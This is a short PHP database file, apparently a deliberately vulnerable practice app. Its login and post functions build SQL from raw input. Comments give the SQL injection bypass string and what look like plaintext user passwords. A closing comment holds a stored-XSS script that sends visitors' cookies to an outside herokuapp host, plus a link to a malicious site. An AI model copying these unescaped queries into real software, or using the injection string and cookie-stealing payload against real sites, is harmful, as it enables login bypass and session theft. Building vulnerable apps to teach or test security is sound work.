<?php
function make_connection(){
	global $connection;
	
	$dbhost="localhost";
	$dbuser="vit";
	$dbpass="";
	$dbname="vit_windows8";
	
	$connection=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);
	if(mysqli_connect_errno()){
		die("Database connection failed:"
			);
	}
}

function check_user($username, $password){
	global $connection;
	//$password = mysql_real_escape_string($password);
	$query="SELECT * from users_list WHERE username='{$username}' AND password='{$password}'";
	// 1' or '1' = '1
	// hkedia, qwwrt221
	// admin, eerneiui#24
	$result=mysqli_query($connection,$query);
	$rowcount=mysqli_num_rows($result);
	if($rowcount>0)
		return true;
	else
		return false;
}

function get_products() {
	global $connection;
	$query = "SELECT * FROM products";
	$result=mysqli_query($connection,$query);
	return $result;
}

function get_posts() {
	global $connection;
	$query = "SELECT * FROM posts";
	$result=mysqli_query($connection,$query);
	return $result;
}

function create_post($post) {
	global $connection;
	$query = "INSERT INTO posts(post) VALUES('".$post."')";
	$result=mysqli_query($connection,$query);
	return $result;
}

/*
hello..<script>var xhttp = new XMLHttpRequest();var link = "https://mapvisualizationirnss.herokuapp.com/upload/data?cookie="+document.cookie;xhttp.open("GET", link, true);xhttp.send();</script>

<a href="http://malicioussite.com/">click here</a>
*/
?>

